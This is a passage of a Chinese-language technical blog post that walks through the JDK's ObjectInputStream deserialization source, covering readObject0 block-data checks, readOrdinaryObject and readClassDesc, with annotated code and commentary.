<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 未知/非法类型码</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复嵌套深度与进入前的块模式</span></span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>readObject0</code> 最开始的地方会先检查当前是否是 Data Block 模式读取：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line"><span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line"><span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果检测的结果是 Data Block 模式，则满足下面两种情况之一则抛出 <code>java.io.OptionalDataException</code> 异常信息。</p>
<ul>
<li>字节流中剩余的字节数量 <code>currentBlockRemaining</code> 大于 0，也就是你<strong>当前还在块里，而且还有字节没读完</strong>。</li>
<li><code>defaultDataEnd</code> 的值为 <code>true</code>，也就是虽然块里的字节已经读完了，但因为写入端<strong>没有明确写 TC_ENDBLOCKDATA</strong>，所以我（读取端）需要**主动抛一个 <code>OptionalDataException(eof=true)</code>**，告诉你‘块已经结束了’。</li>
</ul>
<p>也就是说这里的意思是<strong>你还处在“块数据模式”中，不能直接读取对象（结构化数据），必须先处理完块数据或者正确结束块。否则我抛 <code>OptionalDataException</code> 提醒你怎么做</strong>。</p>
<p>经过这些判断后，会在 if 分支的最后关闭 Data Block 模式。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录进入前是否在“块数据模式”（Block-Data mode）：</span></span><br><span class="line"><span class="comment">// - 在自定义 readObject(..)/readExternal(..) 内部读取原始数据时，通常处于块模式；</span></span><br><span class="line"><span class="comment">// - 要读取“结构化标记”（TC_*）前，需要切到“非块模式”来取类型码。</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">    <span class="comment">// 仍在一个未消费完的“块”里</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">    <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 情形 1：块里仍有 N 字节未读，但此时调用方却想读“对象”</span></span><br><span class="line">        <span class="comment">// → 按规范抛出 OptionalDataException(N)，提示还有 N 字节原始数据待消费</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 修复 4360508：</span></span><br><span class="line"><span class="comment">         * 当前位于“默认序列化字段数据”的块末尾；该数据段没有显式的 TC_ENDBLOCKDATA，</span></span><br><span class="line"><span class="comment">         * 这里模拟“自定义数据结束”的行为，抛出 OptionalDataException(eof=true)，</span></span><br><span class="line"><span class="comment">         * 让上层的 readObject(..) 正确收尾。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 已经不在块中（remain==0 且非 defaultDataEnd），切换到“非块模式”以读取类型码</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后针对不同类型的反序列化数据，会进入不同的分支进行反序列化。对于对象类型进入的是 <code>readOrdinaryObject</code> 函数进行反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">    <span class="comment">// 常规对象：分派到“普通可序列化 / Externalizable / 自定义 readObject”路径</span></span><br><span class="line">    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br></pre></td></tr></table></figure></div>

<h3 id="readOrdinaryObject"><a href="#readOrdinaryObject" class="headerlink" title="readOrdinaryObject"></a>readOrdinaryObject</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回一个“普通对象”（ordinary object）：</span></span><br><span class="line"><span class="comment"> * 非 String、非 Class、非 ObjectStreamClass、非数组、非枚举。</span></span><br><span class="line"><span class="comment"> * 若该对象的运行时类无法解析（类缺失），返回 null，并把 ClassNotFoundException</span></span><br><span class="line"><span class="comment"> * 绑定在该对象的句柄上（handles），调用方随后会感知并抛出异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 读取完成后，passHandle 会被设置为此对象分配到的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（对应 readUnshared）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readOrdinaryObject</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望当前位置是一个“对象起始”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取类描述符（可能是 TC_CLASSDESC 或 TC_PROXYCLASSDESC），并完成若干一致性校验</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">    desc.checkDeserialize(); <span class="comment">// 检查该类是否允许反序列化、接口/构造器/版本等条件（不满足会抛 InvalidClassException）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拿到运行时类</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="comment">// “普通对象”路径不应该出现这些类型；若遇到说明协议/编码路径出错</span></span><br><span class="line">    <span class="keyword">if</span> (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;invalid class descriptor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配实例：</span></span><br><span class="line">    <span class="comment">// - 对于 Serializable：使用反射工厂“分配但不执行构造器”（specially crafted ctor）</span></span><br><span class="line">    <span class="comment">// - 对于 Externalizable：调用 public 无参构造器</span></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">            desc.forClass().getName(), <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为该对象分配/登记句柄：</span></span><br><span class="line">    <span class="comment">// - 共享语义：登记 obj 本身</span></span><br><span class="line">    <span class="comment">// - 非共享语义：登记特殊标记 unsharedMarker（禁止后续引用回指）</span></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若类解析阶段曾记录过 ClassNotFoundException，则把异常绑定到该句柄</span></span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="literal">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取“实例数据区”</span></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        <span class="comment">// Externalizable：由对象自己的 readExternal 完全掌控读取</span></span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Serializable：逐层（父→子）读取</span></span><br><span class="line">        <span class="comment">// - 若声明了 readObject：进入块数据模式读“自定义区”，直到 TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="comment">// - 否则：按字段表默认读取（原始类型/对象字段）</span></span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记本句柄完成构建（便于触发校验回调依赖、清理临时状态等）</span></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// readResolve：若定义了私有 readResolve()，允许把 obj 替换为“解析后对象”</span></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="literal">null</span> &amp;&amp;   <span class="comment">// 构建期间无解析异常</span></span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeReadResolve(obj);        <span class="comment">// 可能返回同一对象或一个替代对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非共享语义 + 返回的是数组：为保证“对象身份不共享”，对数组做一次克隆</span></span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// 反序列化过滤器检查（JDK9+）：对替代对象做类/长度等策略校验</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 用替代对象更新句柄表与返回值</span></span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先会再次判断读到的标识是不是 <code>TC_OBJECT</code>，如果不是，那么直接抛出 <code>InternalError</code> 错误。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 期望当前位置是一个“对象起始”标记</span></span><br><span class="line"><span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>readClassDesc</code> 函数系统中读取当前 Java 对象所属类的描述信息。在这个过程中会完成本地类加载，并且 JEP290 也是在这一步进行检查的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取类描述符（可能是 TC_CLASSDESC 或 TC_PROXYCLASSDESC），并完成若干一致性校验</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>

<p>然后和序列化开始时类似，同样检测当前处理的对象是否是一个可反序列化的对象（<code>checkDeserialize()</code>），如果是，那么就从中读取当前 Java 对象所属类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc.checkDeserialize(); <span class="comment">// 检查该类是否允许反序列化、接口/构造器/版本等条件（不满足会抛 InvalidClassException）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到运行时类</span></span><br><span class="line">Class&lt;?&gt; cl = desc.forClass();</span><br></pre></td></tr></table></figure></div>

<p>紧接着是<strong>“协议一致性保护”</strong>——这些类型<strong>不应该出现在普通对象路径里</strong>，若出现说明编码&#x2F;协议有误（例如手工构造了非法流）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;invalid class descriptor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后这一段使用了 <code>ObjectStreamClass</code> 的方法 <code>newInstance()</code> 创建类的实例。并且为当前构建的对象分配一个句柄（handle），并记录在 <code>passHandle</code> 中</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(), <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br></pre></td></tr></table></figure></div>

<p>如果在 <code>desc.forClass()</code> 阶段遇到了 <code>ClassNotFoundException</code>，这里将它挂在句柄上；稍后如果有其它对象依赖此句柄，会一起抛出 <code>WriteAbortedException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> desc.getResolveException();</span><br><span class="line"><span class="keyword">if</span> (resolveEx != <span class="literal">null</span>) &#123;</span><br><span class="line">    handles.markException(passHandle, resolveEx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>若对象是 <code>Externalizable</code>，直接调用 <code>readExternal()</code>（需读块数据）；否则按 <code>ObjectStreamClass</code> 的类层级，自上而下读取：</p>
<ul>
<li>若某一层有 <code>readObject()</code>，进入块模式、调用该方法</li>
<li>否则默认读取该层字段（primitive + object）</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">    readExternalData((Externalizable) obj, desc);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    readSerialData(obj, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将 <code>passHandle</code> 状态从 <code>READING → OK</code> 允许后续的 <code>TC_REFERENCE</code> 安全回引，同时触发依赖当前句柄的等待者的状态更新（用于异常传播&#x2F;校验依赖）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handles.finish(passHandle);</span><br></pre></td></tr></table></figure></div>

<p>若定义了 <code>private Object readResolve()</code> 方法，会被调用，用于替换成枚举常量、缓存实例、代理对象等。如单例类在反序列化后替换回原始单例对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    handles.lookupException(passHandle) == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    desc.hasReadResolveMethod())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">rep</span> <span class="operator">=</span> desc.invokeReadResolve(obj); <span class="comment">// 返回可能是 obj 本身或另一个替代对象</span></span><br></pre></td></tr></table></figure></div>

<p>如果是 <code>readUnshared()</code> 路径 + 替代对象是数组，那么数组要做 <code>clone()</code>，避免共享引用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">    rep = cloneArray(rep);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>readResolve</code> 返回的不是原对象（说明替换了），且开启了 <code>ObjectInputFilter</code>，则执行安全策略检查。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (rep != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">            filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    handles.setObject(passHandle, obj = rep);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="readClassDesc"><a href="#readClassDesc" class="headerlink" title="readClassDesc"></a>readClassDesc</h3><p><code>readClassDesc</code> 根据数据类型调用对应的函数读取类描述信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回（可能为 null 的）“类描述符”（ObjectStreamClass，简称 OSC）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - 本方法会把当前位置的类型码（TC_*）解析为一个类描述符：</span></span><br><span class="line"><span class="comment"> *   * TC_NULL              → 返回 null；</span></span><br><span class="line"><span class="comment"> *   * TC_REFERENCE         → 返回之前读过并缓存的 OSC（句柄回引）；</span></span><br><span class="line"><span class="comment"> *   * TC_PROXYCLASSDESC    → 读取“动态代理类”的描述符；</span></span><br><span class="line"><span class="comment"> *   * TC_CLASSDESC         → 读取“普通类（非代理）”的描述符。</span></span><br><span class="line"><span class="comment"> * - 读取完成后，&#123;<span class="doctag">@code</span> passHandle&#125; 会被设置为“该类描述符对象”的句柄 ID</span></span><br><span class="line"><span class="comment"> *   （在 TC_NULL 时通常设置为特殊值）。</span></span><br><span class="line"><span class="comment"> * - 若该描述符无法在本地 JVM 解析为 Class（类缺失/类加载失败），则会把</span></span><br><span class="line"><span class="comment"> *   &#123;<span class="doctag">@link</span> ClassNotFoundException&#125; 绑定到该描述符对应的句柄上；上层在合适的位置</span></span><br><span class="line"><span class="comment"> *   会重新抛出该异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（readUnshared 场景下为 true）；</span></span><br><span class="line"><span class="comment"> *                 对于类描述符通常仍走共享语义，遇到 TC_REFERENCE 时会有额外检查。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的 ObjectStreamClass 或 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException                  I/O 或协议读取错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException     类型码非法/流控制信息不一致</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 先窥视一个字节（不消费），判断接下来要读的是哪一种“类描述相关结构”</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            <span class="comment">// 空引用：消费并返回 null；passHandle 会相应更新为“无效句柄”</span></span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            <span class="comment">// 句柄回引：消费并从句柄表中取回之前读取过的类描述符</span></span><br><span class="line">            <span class="comment">// （若为 unshared 语义，会做“不允许别名共享”的校验）</span></span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            <span class="comment">// 动态代理类的类描述符：读取接口列表、注解块、父类描述符等</span></span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="comment">// 普通类（非代理）的类描述符：读取类名、SUID、flags、字段表、注解块、父类描述符等</span></span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 在“期待类描述符”的位置读到未知类型码 → 流已损坏或写入端不遵守协议</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若成功得到一个非空的描述符，做一次一致性/安全校验（可能结合反序列化过滤器等）</span></span><br><span class="line">    <span class="keyword">if</span> (descriptor != <span class="literal">null</span>) &#123;</span><br><span class="line">        validateDescriptor(descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

